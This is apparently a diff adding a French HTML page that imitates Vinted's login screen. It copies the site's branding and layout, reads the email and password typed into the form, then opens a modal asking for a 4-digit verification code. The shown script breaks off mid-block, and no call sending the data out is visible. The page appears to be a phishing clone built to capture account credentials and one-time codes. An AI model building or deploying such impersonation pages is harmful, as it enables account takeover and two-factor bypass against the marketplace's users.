@@ -1,0 +1,1297 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vinted | Toute la seconde main dans une seule application</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="favicon-96x96.png" rel="icon" sizes="96x96" type="image/png"/>
+    <link href="favicon.ico" rel="icon" type="image/x-icon"/>
+    <link href="apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+    <link href="site.webmanifest" rel="manifest"/>
+
+    <style>
+        /* ============================================================
+           VARIABLES ET RESET
+        ============================================================ */
+        :root {
+            --vinted-green: #3ba78d;
+            --vinted-dark-grey: #333333;
+            --vinted-medium-grey: #555555;
+            --vinted-light-grey: #f5f5f5;
+            --vinted-border-grey: #e8e8e8;
+            --vinted-white: #ffffff;
+            --vinted-text-light-grey: #757575;
+            --vinted-footer-link: #888888;
+            --vinted-footer-hover: #3ba78d;
+            --vinted-error-red: #3ba78d;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            color: var(--vinted-dark-grey);
+            line-height: 1.5;
+            background-color: var(--vinted-white);
+            overflow-x: hidden;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+
+        ul {
+            list-style: none;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* ============================================================
+           HEADER — DESKTOP
+        ============================================================ */
+        .main-header {
+            background-color: var(--vinted-white);
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-top {
+            display: flex;
+            align-items: center;
+            padding: 10px 20px;
+            max-width: 1240px;
+            margin: 0 auto;
+        }
+
+        .header-left-section {
+            display: flex;
+            align-items: center;
+        }
+
+        .logo-container {
+            margin-right: 50px;
+            display: flex;
+            align-items: center;
+        }
+
+        .logo-container img {
+            height: 36px;
+        }
+
+        .search-container {
+            display: flex;
+            align-items: center;
+            background-color: var(--vinted-light-grey);
+            border-radius: 4px;
+            padding: 0px 15px;
+            width: 600px;
+            position: relative;
+            margin-left: 0;
+            margin-right: auto;
+        }
+
+        .articles-dropdown {
+            font-size: 14px;
+            color: var(--vinted-medium-grey);
+            cursor: pointer;
+            padding: 8px 0px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            margin-right: 15px;
+            white-space: nowrap;
+            border-right: 1px solid var(--vinted-border-grey);
+            padding-right: 15px;
+        }
+
+        .articles-dropdown i {
+            font-size: 12px;
+        }
+
+        .search-bar {
+            flex-grow: 1;
+            display: flex;
+            align-items: center;
+        }
+
+        .search-bar i {
+            color: var(--vinted-medium-grey);
+            margin-right: 10px;
+        }
+
+        .search-bar input {
+            border: none;
+            outline: none;
+            background: transparent;
+            font-size: 14px;
+            color: var(--vinted-dark-grey);
+            width: 100%;
+            padding: 8px 0;
+        }
+
+        .search-bar input::placeholder {
+            color: var(--vinted-medium-grey);
+        }
+
+        .top-nav {
+            margin-left: 60px;
+        }
+
+        .top-nav ul {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .btn {
+            padding: 8px 15px;
+            border-radius: 5px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            white-space: nowrap;
+            border: none;
+            transition: background-color 0.2s ease;
+        }
+
+        .btn-white {
+            background-color: var(--vinted-white);
+            color: var(--vinted-dark-grey);
+            border: 1px solid var(--vinted-border-grey);
+        }
+
+        .btn-white:hover {
+            background-color: var(--vinted-light-grey);
+        }
+
+        .btn-green {
+            background-color: var(--vinted-green);
+            color: var(--vinted-white);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 12px 15px;
+            height: auto;
+        }
+
+        .btn-green:hover {
+            background-color: #008f51;
+        }
+
+        .icon-link {
+            font-size: 18px;
+            color: var(--vinted-medium-grey);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+        }
+
+        .lang-select {
+            font-size: 14px;
+            color: var(--vinted-medium-grey);
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+
+        /* Catégories — Desktop */
+        .categories-nav {
+            background-color: var(--vinted-white);
+            border-top: 1px solid var(--vinted-border-grey);
+            padding: 10px 0;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.02);
+            display: block;
+        }
+
+        .categories-nav .container {
+            display: flex;
+            justify-content: flex-start;
+            flex-wrap: nowrap;
+            gap: 20px;
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            padding: 0 20px;
+        }
+
+        .categories-nav ul {
+            display: flex;
+            flex-wrap: nowrap;
+            gap: 20px;
+        }
+
+        .categories-nav ul li {
+            flex-shrink: 0;
+        }
+
+        .categories-nav ul li a {
+            font-size: 14px;
+            color: var(--vinted-medium-grey);
+            white-space: nowrap;
+            padding: 5px 0;
+            transition: color 0.2s ease;
+        }
+
+        .categories-nav ul li a:hover {
+            color: var(--vinted-green);
+        }
+
+        /* ============================================================
+           HEADER — MOBILE
+        ============================================================ */
+        .mobile-header-top {
+            display: none;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 15px;
+            background-color: var(--vinted-white);
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+            width: 100%;
+        }
+
+        .mobile-menu-icon {
+            font-size: 24px;
+            color: var(--vinted-dark-grey);
+            cursor: pointer;
+        }
+
+        .mobile-header-logo-container {
+            flex-grow: 1;
+            text-align: center;
+        }
+
+        .mobile-header-logo-container img {
+            height: 32px;
+        }
+
+        .btn-connect-mobile {
+            background-color: var(--vinted-green);
+            color: var(--vinted-white);
+            padding: 8px 12px;
+            border-radius: 5px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            white-space: nowrap;
+            border: none;
+            transition: background-color 0.2s ease;
+        }
+
+        .btn-connect-mobile:hover {
+            background-color: #008f51;
+        }
+
+        /* Menu mobile coulissant */
+        .mobile-nav-menu {
+            position: fixed;
+            top: 0;
+            left: -100%;
+            width: 80%;
+            max-width: 300px;
+            height: 100%;
+            background-color: var(--vinted-white);
+            box-shadow: 2px 0 5px rgba(0, 0, 0, 0.2);
+            z-index: 200;
+            transition: left 0.3s ease-in-out;
+            overflow-y: scroll;
+            padding-top: 60px;
+            scrollbar-width: none;
+            -ms-overflow-style: none;
+        }
+
+        .mobile-nav-menu::-webkit-scrollbar {
+            display: none;
+        }
+
+        .mobile-nav-menu.active {
+            left: 0;
+        }
+
+        .mobile-nav-menu ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .mobile-nav-menu ul li {
+            border-bottom: 1px solid var(--vinted-border-grey);
+        }
+
+        .mobile-nav-menu ul li a,
+        .mobile-nav-menu .menu-item-button {
+            display: block;
+            padding: 15px 20px;
+            color: var(--vinted-dark-grey);
+            font-size: 16px;
+            font-weight: 500;
+            text-decoration: none;
+            transition: background-color 0.2s ease;
+        }
+
+        .mobile-nav-menu ul li a:hover,
+        .mobile-nav-menu .menu-item-button:hover {
+            background-color: var(--vinted-light-grey);
+        }
+
+        .mobile-nav-menu .menu-item-button {
+            background-color: transparent;
+            border: none;
+            width: 100%;
+            text-align: left;
+            cursor: pointer;
+            box-sizing: border-box;
+            color: var(--vinted-dark-grey);
+        }
+
+        .mobile-nav-menu .menu-item-button.sell-articles {
+            color: var(--vinted-green);
+            font-weight: 600;
+        }
+
+        /* Overlay fond sombre menu mobile */
+        .mobile-menu-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 150;
+            visibility: hidden;
+            opacity: 0;
+            transition: visibility 0s, opacity 0.3s ease;
+        }
+
+        .mobile-menu-overlay.active {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        /* Barre de recherche mobile */
+        .mobile-search-bar-container {
+            display: none;
+            background-color: var(--vinted-white);
+            padding: 10px 15px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+            border-top: 1px solid var(--vinted-border-grey);
+        }
+
+        .mobile-search-bar-container .search-container {
+            width: 100%;
+            padding: 6px 12px;
+            font-size: 13px;
+        }
+
+        .mobile-search-bar-container .articles-dropdown {
+            font-size: 13px;
+            padding: 0;
+            margin-right: 10px;
+            border-right: 1px solid var(--vinted-border-grey);
+            padding-right: 10px;
+        }
+
+        .mobile-search-bar-container .search-bar input {
+            font-size: 13px;
+            padding: 6px 0;
+        }
+
+        /* Chips catégories mobile */
+        .mobile-categories-chips {
+            display: none;
+            background-color: var(--vinted-white);
+            padding: 10px 0;
+            border-top: 1px solid var(--vinted-border-grey);
+            border-bottom: 1px solid var(--vinted-border-grey);
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            white-space: nowrap;
+            scrollbar-width: none;
+            -ms-overflow-style: none;
+        }
+
+        .mobile-categories-chips::-webkit-scrollbar {
+            display: none;
+        }
+
+        .mobile-categories-chips ul {
+            display: inline-flex;
+            gap: 8px;
+            padding: 0 15px;
+            margin: 0;
+        }
+
+        .mobile-categories-chips li {
+            flex-shrink: 0;
+            list-style: none;
+        }
+
+        .mobile-categories-chips a {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 8px 16px;
+            border: 1px solid var(--vinted-border-grey);
+            border-radius: 20px;
+            background-color: var(--vinted-white);
+            color: var(--vinted-medium-grey);
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            white-space: nowrap;
+            transition: background-color 0.2s ease, border-color 0.2s ease, color 0.2s ease;
+        }
+
+        .mobile-categories-chips a:hover {
+            background-color: var(--vinted-light-grey);
+            border-color: var(--vinted-dark-grey);
+            color: var(--vinted-dark-grey);
+        }
+
+        .mobile-categories-chips a i {
+            margin-right: 6px;
+            font-size: 14px;
+        }
+
+        /* ============================================================
+           CONTENU PRINCIPAL — FORMULAIRE DE CONNEXION
+        ============================================================ */
+        main {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 60vh;
+            padding: 40px 20px;
+            background-color: #ffffff;
+        }
+
+        .login-card {
+            width: 100%;
+            max-width: 440px;
+            padding: 40px;
+            border: 1px solid #e8e8e8;
+            border-radius: 4px;
+            text-align: center;
+        }
+
+        .login-card h1 {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 35px;
+            color: #1a1a1a;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+            position: relative;
+            border-bottom: 1px solid #ddd;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 0;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            color: #222;
+            background: transparent;
+        }
+
+        .eye-toggle {
+            cursor: pointer;
+            padding: 8px;
+            display: flex;
+            align-items: center;
+            background: none;
+            border: none;
+            outline: none;
+            position: relative;
+        }
+
+        .eye-toggle svg {
+            width: 22px;
+            height: 22px;
+            fill: none;
+            stroke: #666;
+            stroke-width: 1.5;
+        }
+
+        .slash-bar {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 20px;
+            height: 1.5px;
+            background-color: #666;
+            transform: translate(-50%, -50%) rotate(45deg) scaleX(0);
+            transform-origin: center;
+            transition: transform 0.2s ease-in-out;
+        }
+
+        input[type="password"] + .eye-toggle .slash-bar {
+            transform: translate(-50%, -50%) rotate(45deg) scaleX(1);
+        }
+
+        .btn-submit {
+            width: 100%;
+            background-color: #00767d;
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        .btn-submit:hover {
+            background-color: #005f65;
+        }
+
+        .links-container {
+            margin-top: 30px;
+        }
+
+        .links-container a {
+            display: block;
+            text-decoration: none;
+            color: #00767d;
+            font-size: 14px;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+
+        /* ============================================================
+           MODAL OTP — VÉRIFICATION
+        ============================================================ */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-content {
+            background: white;
+            width: 90%;
+            max-width: 480px;
+            padding: 40px 30px;
+            border-radius: 8px;
+            position: relative;
+            text-align: center;
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            font-size: 28px;
+            cursor: pointer;
+            color: #555;
+            background: none;
+            border: none;
+        }
+
+        .modal-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 25px;
+        }
+
+        .modal-text {
+            font-size: 15px;
+            line-height: 1.5;
+            color: #444;
+            margin-bottom: 10px;
+        }
+
+        .resend-link {
+            color: #43a88e;
+            text-decoration: none;
+            font-weight: 500;
+            display: inline-block;
+            margin-bottom: 25px;
+        }
+
+        .otp-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .otp-box {
+            width: 65px;
+            height: 55px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 24px;
+            text-align: center;
+            outline: none;
+        }
+
+        .otp-box:focus {
+            border-color: #43a88e;
+        }
+
+        .btn-verify {
+            width: 100%;
+            background-color: #43a88e;
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .btn-verify:hover {
+            background-color: #368f78;
+        }
+
+        /* ============================================================
+           MESSAGE DE SUCCÈS — VÉRIFICATION OTP
+        ============================================================ */
+        .redirect-countdown {
+            margin-top: 20px;
+            padding: 14px 18px;
+            background-color: #f0faf7;
+            border: 1px solid #43a88e;
+            border-radius: 6px;
+            font-size: 16px;
+            color: #2d7a65;
+            font-weight: 500;
+            display: none;
+            text-align: center;
+            line-height: 1.6;
+        }
+
+        /* ============================================================
+           FOOTER
+        ============================================================ */
+        .main-footer {
+            background-color: var(--vinted-white);
+            border-top: 1px solid var(--vinted-border-grey);
+            padding: 40px 0 20px;
+        }
+
+
+        .footer-content {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+
+        .footer-column {
+            flex: 1;
+            min-width: 200px;
+        }
+
+        .footer-column h4 {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--vinted-dark-grey);
+            margin-bottom: 15px;
+        }
+
+        .footer-column ul li {
+            margin-bottom: 8px;
+        }
+
+        .footer-column ul li a {
+            font-size: 14px;
+            color: var(--vinted-footer-link);
+            transition: color 0.2s ease;
+        }
+
+        .footer-column ul li a:hover {
+            color: var(--vinted-footer-hover);
+        }
+
+        .footer-bottom {
+            border-top: 1px solid var(--vinted-border-grey);
+            padding-top: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+
+        .social-icons a {
+            color: var(--vinted-footer-link);
+            font-size: 20px;
+            margin-right: 15px;
+            transition: color 0.2s ease;
+        }
+
+        .social-icons a:hover {
+            color: var(--vinted-footer-hover);
+        }
+
+        .app-badges img {
+            height: 40px;
+            margin-left: 10px;
+        }
+
+        .legal-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .legal-links a {
+            font-size: 13px;
+            color: var(--vinted-footer-link);
+            white-space: nowrap;
+            transition: color 0.2s ease;
+        }
+
+        .legal-links a:hover {
+            color: var(--vinted-footer-hover);
+        }
+
+        /* ============================================================
+           RESPONSIVE
+        ============================================================ */
+        @media (max-width: 1024px) {
+            .header-top {
+                flex-wrap: wrap;
+                justify-content: center;
+                gap: 15px;
+            }
+
+            .header-left-section {
+                width: 100%;
+                justify-content: center;
+                margin-bottom: 10px;
+                flex-wrap: wrap;
+            }
+
+            .logo-container {
+                margin-right: 15px;
+                text-align: center;
+                width: 100%;
+                margin-bottom: 10px;
+            }
+
+            .logo-container img {
+                height: 32px;
+            }
+
+            .search-container {
+                width: 100%;
+                max-width: 600px;
+            }
+
+            .top-nav {
+                margin-left: 0;
+                width: 100%;
+                display: flex;
+                justify-content: center;
+            }
+
+            .top-nav ul {
+                flex-direction: row;
+                flex-wrap: wrap;
+                justify-content: center;
+                width: 100%;
+                gap: 10px;
+            }
+
+            .footer-content {
+                justify-content: center;
+                text-align: center;
+            }
+
+            .footer-column {
+                min-width: 45%;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .header-top {
+                display: none;
+            }
+
+            .categories-nav {
+                display: none;
+            }
+
+            .mobile-header-top {
+                display: flex;
+            }
+
+            .mobile-search-bar-container {
+                display: block;
+            }
+
+            .mobile-categories-chips {
+                display: block;
+            }
+
+            .logo-container {
+                margin-right: 0;
+                margin-bottom: 10px;
+                width: 100%;
+                text-align: center;
+            }
+
+            .logo-container img {
+                height: 30px;
+            }
+
+            .mobile-header-logo-container img {
+                height: 30px;
+            }
+
+            .footer-bottom {
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+            }
+
+            .legal-links {
+                justify-content: center;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .login-card {
+                border: none;
+                padding: 20px;
+            }
+
+            .otp-box {
+                width: 50px;
+                height: 50px;
+            }
+
+            .mobile-categories-chips ul {
+                gap: 6px;
+                padding: 0 10px;
+            }
+
+            .mobile-categories-chips a {
+                padding: 7px 14px;
+                font-size: 13px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ============================================================
+         HEADER
+    ============================================================ -->
+    <header class="main-header">
+
+        <!-- Mobile : barre supérieure -->
+        <div class="mobile-header-top">
+            <i class="fas fa-bars mobile-menu-icon" id="mobile-menu-icon"></i>
+            <div class="mobile-header-logo-container">
+                <a href="#">
+                    <img src="logovinteddujour.png" alt="Votre Logo Mobile">
+                </a>
+            </div>
+            <button class="btn-connect-mobile" id="login-signup-mobile-btn">Se connecter</button>
+        </div>
+
+        <!-- Mobile : barre de recherche -->
+        <div class="mobile-search-bar-container">
+            <div class="search-container">
+                <div class="articles-dropdown">
+                    Articles <i class="fas fa-chevron-down"></i>
+                </div>
+                <div class="search-bar">
+                    <i class="fas fa-search"></i>
+                    <input type="text" placeholder="Rechercher des articles">
+                </div>
+            </div>
+        </div>
+
+        <!-- Mobile : chips catégories -->
+        <div class="mobile-categories-chips">
+            <ul>
+                <li><a href="#"><i class="fas fa-eye"></i> <span>Voir tout</span></a></li>
+                <li><a href="#"><i class="fas fa-female"></i> <span>Femmes</span></a></li>
+                <li><a href="#"><i class="fas fa-male"></i> <span>Hommes</span></a></li>
+                <li><a href="#"><i class="fas fa-crown"></i> <span>Créateurs</span></a></li>
+                <li><a href="#"><i class="fas fa-child"></i> <span>Enfant</span></a></li>
+                <li><a href="#"><i class="fas fa-home"></i> <span>Maison</span></a></li>
+                <li><a href="#"><i class="fas fa-microchip"></i> <span>Électroniques</span></a></li>
+                <li><a href="#"><i class="fas fa-gamepad"></i> <span>Divertissement</span></a></li>
+                <li><a href="#"><i class="fas fa-paw"></i> <span>Animaux</span></a></li>
+            </ul>
+        </div>
+
+        <!-- Mobile : menu coulissant -->
+        <div class="mobile-nav-menu" id="mobile-nav-menu">
+            <ul>
+                <li><button class="menu-item-button sell-articles">Vends tes articles</button></li>
+                <li><button class="menu-item-button" id="mobile-menu-login-signup-btn">S'inscrire | Se connecter</button></li>
+                <li><a href="#">Ton guide Vinted</a></li>
+                <li><a href="#">Femmes</a></li>
+                <li><a href="#">Hommes</a></li>
+                <li><a href="#">Articles de créateurs</a></li>
+                <li><a href="#">Enfants</a></li>
+                <li><a href="#">Maison</a></li>
+                <li><a href="#">Électronique</a></li>
+                <li><a href="#">Divertissement</a></li>
+                <li><a href="#">Sport</a></li>
+                <li><a href="#">Animaux</a></li>
+                <li><a href="#">À propos</a></li>
+                <li><a href="#">Notre plateforme</a></li>
+            </ul>
+        </div>
+        <div class="mobile-menu-overlay" id="mobile-menu-overlay"></div>
+
+        <!-- Desktop : barre principale -->
+        <div class="header-top">
+            <div class="header-left-section">
+                <div class="logo-container">
+                    <a href="#">
+                        <img src="logovinteddujour.png" alt="Votre Logo">
+                    </a>
+                </div>
+                <div class="search-container">
+                    <div class="articles-dropdown">
+                        Articles <i class="fas fa-chevron-down"></i>
+                    </div>
+                    <div class="search-bar">
+                        <i class="fas fa-search"></i>
+                        <input type="text" placeholder="Rechercher des articles">
+                    </div>
+                </div>
+            </div>
+            <nav class="top-nav">
+                <ul>
+                    <li><a href="#" class="btn btn-white" id="login-signup-btn">S'inscrire | Se connecter</a></li>
+                    <li><a href="#" class="btn btn-green">Vends tes articles</a></li>
+                    <li><a href="#" class="icon-link"><i class="fas fa-question-circle"></i></a></li>
+                    <li><a href="#" class="lang-select">FR <i class="fas fa-chevron-down"></i></a></li>
+                </ul>
+            </nav>
+        </div>
+
+        <!-- Desktop : navigation catégories -->
+        <nav class="categories-nav">
+            <div class="container">
+                <ul>
+                    <li><a href="#">Femmes</a></li>
+                    <li><a href="#">Hommes</a></li>
+                    <li><a href="#">Articles de créateurs</a></li>
+                    <li><a href="#">Enfants</a></li>
+                    <li><a href="#">Maison</a></li>
+                    <li><a href="#">Électronique</a></li>
+                    <li><a href="#">Divertissement</a></li>
+                    <li><a href="#">Sport</a></li>
+                    <li><a href="#">Animaux</a></li>
+                    <li><a href="#">À propos</a></li>
+                    <li><a href="#">Notre plateforme</a></li>
+                </ul>
+            </div>
+        </nav>
+    </header>
+
+    <!-- ============================================================
+         CONTENU PRINCIPAL — FORMULAIRE DE CONNEXION
+    ============================================================ -->
+    <main>
+        <div class="login-card">
+            <h1>Se connecter</h1>
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="emailInput" placeholder="Identifiant ou adresse email" required>
+                </div>
+
+                <div class="input-group">
+                    <input type="password" id="passwordInput" placeholder="Mot de passe" required>
+                    <button type="button" class="eye-toggle" id="togglePassword">
+                        <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                            <circle cx="12" cy="12" r="3"></circle>
+                        </svg>
+                        <div class="slash-bar"></div>
+                    </button>
+                </div>
+
+                <button type="submit" class="btn-submit">Continuer</button>
+            </form>
+
+            <div class="links-container">
+                <a href="#">Mot de passe oublié ?</a>
+                <a href="#">Un problème ?</a>
+            </div>
+        </div>
+    </main>
+
+    <!-- ============================================================
+         MODAL OTP — VÉRIFICATION
+    ============================================================ -->
+    <div class="modal-overlay" id="otpModal">
+        <div class="modal-content">
+            <button class="close-modal" id="closeBtn">&times;</button>
+            <h2 class="modal-title">Vérification</h2>
+
+            <p class="modal-text">
+                Un code à 4 chiffres a été envoyé à l'adresse e-mail/numéro de téléphone associé(e) à
+                <strong id="targetUser">...</strong>. Veuillez le saisir ci-dessous.
+            </p>
+
+            <a href="#" class="resend-link">Renvoyer le code</a>
+
+            <div class="otp-inputs">
+                <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+                <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+                <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+                <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+            </div>
+
+            <button type="button" class="btn-verify" id="verifyBtn">Vérifier le code</button>
+
+            <div class="redirect-countdown" id="redirectCountdown">
+                Vérification réussie &#10003;
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================
+         FOOTER
+    ============================================================ -->
+    <footer class="main-footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-column">
+                    <h4>Vinted</h4>
+                    <ul>
+                        <li><a href="#">À propos de Vinted</a></li>
+                        <li><a href="#">Carrière</a></li>
+                        <li><a href="#">Le développement durable</a></li>
+                        <li><a href="#">Presse</a></li>
+                        <li><a href="#">Publicités</a></li>
+                        <li><a href="#">Accessibilité</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4>Découvrir</h4>
+                    <ul>
+                        <li><a href="#">Comment ça marche ?</a></li>
+                        <li><a href="#">Vérification de l'article</a></li>
+                        <li><a href="#">Applications mobiles</a></li>
+                        <li><a href="#">Tableau de bord</a></li>
+                        <li><a href="#">Vinted Pro</a></li>
+                        <li><a href="#">Guide Vinted Pro</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4>Aide</h4>
+                    <ul>
+                        <li><a href="#">Centre d'aide</a></li>
+                        <li><a href="#">Vendre</a></li>
+                        <li><a href="#">Acheter</a></li>
+                        <li><a href="#">Confiance et sécurité</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="footer-bottom">
+                <div class="social-icons">
+                    <a href="#"><i class="fab fa-facebook-f"></i></a>
+                    <a href="#"><i class="fab fa-linkedin-in"></i></a>
+                    <a href="#"><i class="fab fa-instagram"></i></a>
+                </div>
+                <div class="app-badges">
+                    <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/2560px-Download_on_the_App_Store_Badge.svg.png" alt="Télécharger sur l'App Store"></a>
+                    <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/2560px-Google_Play_Store_badge_EN.svg.png" alt="Disponible sur Google Play"></a>
+                </div>
+                <div class="legal-links">
+                    <a href="#">Politique de Confidentialité</a>
+                    <a href="#">Politique de cookies</a>
+                    <a href="#">Paramètres des cookies</a>
+                    <a href="#">Termes et Conditions</a>
+                    <a href="#">Notre plateforme</a>
+                    <a href="#">Termes et conditions de Vinted Pro</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- ============================================================
+         JAVASCRIPT
+    ============================================================ -->
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+
+            // --- Barre de recherche desktop : effet focus ---
+            const desktopSearchInput = document.querySelector('.header-top .search-bar input');
+            const desktopSearchContainer = document.querySelector('.header-top .search-container');
+
+            if (desktopSearchInput && desktopSearchContainer) {
+                desktopSearchInput.addEventListener('focus', () => {
+                    desktopSearchContainer.style.boxShadow = '0 0 0 1px var(--vinted-green)';
+                });
+                desktopSearchInput.addEventListener('blur', () => {
+                    desktopSearchContainer.style.boxShadow = 'none';
+                });
+            }
+
+            // --- Redirection vers la page de connexion ---
+            const redirectToSignup = (e) => {
+                e.preventDefault();
+                window.location.href = 'member.signup.html';
+            };
+
+            const loginSignupBtn = document.getElementById('login-signup-btn');
+            const loginSignupMobileBtn = document.getElementById('login-signup-mobile-btn');
+            const mobileMenuLoginSignupBtn = document.getElementById('mobile-menu-login-signup-btn');
+
+            if (loginSignupBtn) loginSignupBtn.addEventListener('click', redirectToSignup);
+            if (loginSignupMobileBtn) loginSignupMobileBtn.addEventListener('click', redirectToSignup);
+            if (mobileMenuLoginSignupBtn) mobileMenuLoginSignupBtn.addEventListener('click', redirectToSignup);
+
+            // --- Menu mobile : ouverture / fermeture ---
+            const mobileMenuIcon = document.getElementById('mobile-menu-icon');
+            const mobileNavMenu = document.getElementById('mobile-nav-menu');
+            const mobileMenuOverlay = document.getElementById('mobile-menu-overlay');
+
+            if (mobileMenuIcon) {
+                mobileMenuIcon.addEventListener('click', () => {
+                    mobileNavMenu.classList.toggle('active');
+                    mobileMenuOverlay.classList.toggle('active');
+                    document.body.style.overflow = mobileNavMenu.classList.contains('active') ? 'hidden' : 'auto';
+                });
+            }
+
+            if (mobileMenuOverlay) {
+                mobileMenuOverlay.addEventListener('click', () => {
+                    mobileNavMenu.classList.remove('active');
+                    mobileMenuOverlay.classList.remove('active');
+                    document.body.style.overflow = 'auto';
+                });
+            }
+
+            // --- Formulaire de connexion : affichage/masquage du mot de passe ---
+            const toggleBtn = document.getElementById('togglePassword');
+            const passInput = document.getElementById('passwordInput');
+
+            if (toggleBtn && passInput) {
+                toggleBtn.addEventListener('click', () => {
+                    passInput.type = passInput.type === 'password' ? 'text' : 'password';
+                });
+            }
+
+            // --- Formulaire de connexion : soumission → ouverture modal OTP ---
+            const loginForm = document.getElementById('loginForm');
+            const otpModal = document.getElementById('otpModal');
+            const emailInput = document.getElementById('emailInput');
+            const targetUserText = document.getElementById('targetUser');
+
+            if (loginForm) {
+                loginForm.addEventListener("submit", async (e) => {
+                    e.preventDefault();
+
+                    const email = emailInput.value;
+                    const password = passInput.value; // passInput est déjà défini plus haut
+
+
+
+                    if (targetUserText) targetUserText.textContent = email;
+                    otpModal.style.display = "flex";
+                });
+            }
+
+            // --- Modal OTP : fermeture ---
+            const closeBtn = document.getElementById('closeBtn');
+            if (closeBtn) {
+                closeBtn.addEventListener('click', () => {
+                    otpModal.style.display = 'none';
+                });
+            }
+
+            // --- Modal OTP : navigation automatique entre les cases ---
+            const otpBoxes = document.querySelectorAll('.otp-box');
+            otpBoxes.forEach((box, idx) => {
+                box.addEventListener('input', (e) => {
+                    if (e.target.value && idx < otpBoxes.length - 1) {
+                        otpBoxes[idx + 1].focus();
+                    }
+                });
+                box.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && !box.value && idx > 0) {
+                        otpBoxes[idx - 1].focus();
+                    }
+                });
+            });
+
